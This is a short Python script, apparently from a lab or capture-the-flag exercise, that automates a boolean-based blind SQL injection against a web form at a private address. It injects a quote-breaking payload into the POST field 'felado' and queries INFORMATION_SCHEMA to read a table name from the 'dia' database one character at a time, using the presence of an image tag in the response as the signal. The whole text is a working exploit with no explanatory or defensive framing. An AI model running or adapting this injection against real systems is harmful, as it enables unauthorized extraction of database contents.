import requests
r = requests.post('http://10.10.8.11:8666/', auth=('user', 'pass'))

url = "http://10.10.8.11:8666/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890."

db = "dia"
table = ""

while True:
    br = True
    for char in chars:
        expr = f"(SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='{db}' LIMIT 1 OFFSET 1) LIKE '{table}{char}%'"
        data = {"felado": "' AND " + expr +";#"}
        resp = requests.post(url, data = data)
        found = "<img" in resp.text
        if found:
            table = table + char
            br = False
            print(table)
            break
    if br:
        break
